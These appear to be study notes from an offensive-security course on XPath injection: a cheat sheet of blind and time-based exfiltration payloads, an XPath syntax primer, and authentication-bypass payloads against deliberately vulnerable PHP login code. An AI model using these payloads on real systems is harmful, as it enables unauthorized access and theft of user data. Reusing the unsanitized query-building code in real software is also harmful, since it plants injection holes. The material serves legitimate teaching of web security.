#### Data Exfiltration

Unrestricted:
- Leak entire XML document via union injection: `| //text()`

Restricted:
- Determine schema depth via chain of wildcards `/*[1]`
- iterate through XML schema by increasing the indices to exfiltrate the entire document step-by-step

#### Blind Data Exfiltration

|Description|Payload|Query|
|---|---|---|
|Exfiltrating Node Name's Length|`invalid' or string-length(name(/*[1]))=1 and '1'='1`|`/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']`|
|Exfiltrating Node Name|`invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']`|
|Exfiltrating Number of Child Nodes|`invalid' or count(/*[1]/*)=1 and '1'='1`|`/users/user[username='invalid' or count(/*[1]/*)=1 and '1'='1']`|
|Exfiltrating Value Length|`invalid' or string-length(/users/user[1]/username)=1 and '1'='1`|`/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']`|
|Exfiltrating Value|`invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']`|

#### Time-based

Force the web application to iterate over the entire XML document exponentially:

```xpath
count((//.)[count((//.))])
```

Determine whether the first letter of the "username" is "a" based on the time it takes: if it is, the query will utilize a significant processing time, otherwise, it won't.

```xpath
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

xpath core


XPath Foundations
In order to dive into XPath, we first need to establish a baseline in XPath terminology. To do so, let us consider the following XML document:
```
Code: xml
<?xml version="1.0" encoding="UTF-8"?>
  
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>

  <!-- this is a comment -->
  <module>
    <title>Attacking Enterprise Networks</title>
    <author co-author="LTNB0B">mrb3n</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>
```

An XML document usually begins with the XML declaration, which specifies the XML version and encoding. In the above XML document, the XML declaration is <?xml version="1.0" encoding="UTF-8"?>. If the declaration is omitted, the XML parser assumes the version 1.0 and the encoding UTF-8.

The data in an XML document is formatted in a tree structure consisting of nodes with the top element called the root element node. In our case, the root node is the academy_modules node. Furthermore, there are element nodes such as module and title, and attribute nodes such as co-author="LTNB0B" or difficulty="medium". Additionally, there are comment nodes which contain comments such as this is a comment and text nodes which contain character data from element or attribute nodes such as Web Attacks and LTNB0B in our example. There are also namespace nodes and processing instruction nodes, which we will not consider here, adding up to a total of 7 different node types.

Since XML documents form a tree structure, each element and attribute node has exactly one parent node, while each element node may have an arbitrary number of child nodes. Nodes with the same parent are called sibling nodes. We can traverse the tree upwards or downwards from a given node to determine all ancestor nodes or descendant nodes.

Nodes
Now that we have discussed the basic terminology of XPath, we can dive into the query syntax. In this module, we will only discuss the abbreviated syntax. For more details on the XPath syntax, look at the W3C specification.

Each XPath query selects a set of nodes from the XML document. A query is evaluated from a context node, which marks the starting point. Therefore, depending on the context node, the same query may have different results. Here is an overview of the base cases of XPath queries for selecting nodes:
```
Query	Explanation
module	Select all module child nodes of the context node
/	Select the document root node
//	Select descendant nodes of the context node
.	Select the context node
..	Select the parent node of the context node
@difficulty	Select the difficulty attribute node of the context node
text()	Select all text node child nodes of the context node
We can use these base cases to construct more complicated queries. To avoid ambiguity of the query result depending on the context node, we can start our query at the document root:

Query	Explanation
/academy_modules/module	Select all module child nodes of academy_modules node
//module	Select all module nodes
/academy_modules//title	Select all title nodes that are descendants of the academy_modules node
/academy_modules/module/tier/@difficulty	Select the difficulty attribute node of all tier element nodes under the specified path
//@difficulty	Select all difficulty attribute nodes
Note: If a query starts with //, the query is evaluated from the document root and not at the context node.
```
Predicates
Predicates filter the result from an XPath query similar to the WHERE clause in a SQL query. Predicates are part of the XPath query and are contained within brackets []. Here are some example predicates:
```
Query	Explanation
/academy_modules/module[1]	Select the first module child node of the academy_modules node
/academy_modules/module[position()=1]	Equivalent to the above query
/academy_modules/module[last()]	Select the last module child node of the academy_modules node
/academy_modules/module[position()<3]	Select the first two module child nodes of the academy_modules node
//module[tier=2]/title	Select the title of all modules where the tier element node equals 2
//module/author[@co-author]/../title	Select the title of all modules where the author element node has a co-author attribute node
//module/tier[@difficulty="medium"]/..	Select all modules where the tier element node has a difficulty attribute node set to medium
Predicates support the following operands:

Operand	Explanation
+	Addition
-	Subtraction
*	Multiplication
div	Division
=	Equal
!=	Not Equal
<	Less than
<=	Less than or Equal
>	Greater than
>=	Greater than or Equal
or	Logical Or
and	Logical And
mod	Modulus
Wildcards & Union
Sometimes, we do not care about the type of node in a path. In that case, we can use one of the following wildcards:
```
Query	Explanation
node()	Matches any node
*	Matches any element node
@*	Matches any attribute node
We can use these wildcards to construct queries like so:

Query	Explanation
//*	Select all element nodes in the document
//module/author[@*]/..	Select all modules where the author element node has at least one attribute node of any kind
/*/*/title	Select all title nodes that are exactly two levels below the document root
Note: The wildcard * matches any node but not any descendants like // does. Therefore, we need to specify the correct amount of wildcards in our query. In our example XML document, the query /*/*/title returns all module titles, but the query /*/title returns nothing.

Lastly, we can combine multiple XPath queries with the union operator | like so:

Query	Explanation
```
//module[tier=2]/title/text() | //module[tier=3]/title/text()	Select the title of all modules in tiers 2 and 3
```

Abuse..

Foundation
Before jumping into discovering and exploiting authentication bypasses via XPath injection, we first need to discuss how authentication via XPath queries may be implemented. As an example, let us consider an XML document that stores user data like this:
```
Code: xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>P@ssw0rd!</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>admin</username>
		<password>admin</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>Academy_student!</password>
	</user>
</users>
```
To perform authentication, the web application might execute an XPath query like the following:

Code: xpath
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
Vulnerable PHP code inserts the username and password without prior sanitization into the query:

Code: php
```
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```
We aim to bypass authentication by injecting a username and password such that the XPath query always evaluates to true. We can achieve this by injecting the value ' or '1'='1 as username and password. The resulting XPath query looks like this:

Code: xpath
```
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```
Since the predicate evaluates to true, the query returns all user element nodes from the XML document. Therefore, we are logged in as the first user. In our example document, this is the user kgrenvile. However, what if we want to log in as the admin user to obtain the highest permissions? In that case, we have to inject a username of admin' or '1'='1 and an arbitrary value for the password. That way, the resulting XPath query looks like this:

Code: xpath
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
Due to the or clause, the above query will log us in as the admin user without providing the correct password.

Exploitation
In real-world scenarios, passwords are often hashed. Additionally, we might not know a valid username, therefore, we cannot use the abovementioned payloads. Fortunately, we can use more advanced injection payloads to bypass authentication in such cases. Consider the following example:
```
Code: xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>8a24367a1f46c141048752f2d5bbd14b</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>obfuscatedadminuser</username>
		<password>21232f297a57a5a743894a0e4a801fc3</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>295362c2618a05ba3899904a6a3f5bc0</password>
	</user>
</users>
```

In this case, the vulnerable PHP code may look like this:

Code: php
```
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
```
Since the password is hashed before being inserted into the query, injecting a username and password of ' or '1'='1 will result in the following query:

Code: xpath
```
/users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531fb474']
```
This query does not return any nodes, thus, we cannot bypass authentication this way. Since we also do not know any valid username, we cannot bypass authentication with the payloads discussed so far.

Firstly, we can inject a double or clause in the username to make the XPath query return true, thereby returning all user nodes such that we log in as the first user. An example payload would be ' or true() or ' resulting in the following query:

Code: xpath
```/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```
Due to the way the query is evaluated, the double or results in a universal true returned by the query, so we bypass the authentication. However, just like discussed previously, we might want to log in as a specific user to obtain more privileges.

One way to do this is to iterate over all users by their position. This can be achieved with the following payload: ' or position()=2 or ', resulting in the following query:

Code: xpath
```
/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```
This will return only the second user node. We can increment the position to iterate over all users until we find the user we seek. There might be millions of users in real-world deployments, thus, this manual technique will become infeasible very quickly. Instead, we can search for specific users if we know part of the username. For this, consider the following payload: ' or contains(.,'admin') or ', resulting in the following query:

Code: xpath
```
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```
This query returns all user nodes that contain the string admin in any descendants. Since the username node is a child of the user node, this returns all users that contain the substring admin in the username.
